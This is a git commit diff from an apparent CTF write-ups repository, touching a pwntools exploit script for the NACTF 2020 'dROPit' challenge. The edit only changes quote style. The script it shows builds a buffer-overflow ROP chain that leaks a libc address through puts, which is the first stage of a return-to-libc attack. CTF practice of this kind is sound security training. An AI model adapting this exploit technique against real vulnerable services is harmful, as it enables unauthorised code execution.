ef8bfcde637d37b2a13fc2b289dacd189b323cae
Dmitriy Rodionov <57829161+Burgos1337@users.noreply.github.com>
2020-12-12 17:06:28 +0300

    some writeups added

--- 2020/NACTF 2020/dROPit/dropit_libc_leak.py
+++ 2020/NACTF 2020/dROPit/dropit_libc_leak.py
@@ -3,7 +3,7 @@ from pwn import *
 import struct
 import binascii
 
-elf = ELF("./dropit")
+elf = ELF('./dropit')
 rop = ROP(elf)
 
 POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0] # 0x401203
@@ -11,10 +11,10 @@ PUTS_GOT = elf.got['puts'] # 0x403fc8
 PUTS_PLT = elf.plt['puts'] # 0x401030
 MAIN = elf.symbols['main'] # 0x401146
 
-info("pop rdi gadget: %s" % hex(POP_RDI))
-info("puts@got: %s" % hex(PUTS_GOT))
-info("puts@plt: %s" % hex(PUTS_PLT))
-info("main: %s" % hex(MAIN))
+info('pop rdi gadget: %s' % hex(POP_RDI))
+info('puts@got: %s' % hex(PUTS_GOT))
+info('puts@plt: %s' % hex(PUTS_PLT))
+info('main: %s' % hex(MAIN))
 
 payload  = b'A' * 56
 payload += p64(POP_RDI)
@@ -29,5 +29,5 @@ p.sendline(payload)
 puts_remote_raw = p.recv()
 p.recvline()
 
-remote_leak = struct.unpack("<Q", puts_remote_raw.ljust(8, b'\x00'))[0]
-info("leaked libc address: %s" % hex(remote_leak))
+remote_leak = struct.unpack('<Q', puts_remote_raw.ljust(8, b'\x00'))[0]
+info('leaked libc address: %s' % hex(remote_leak))
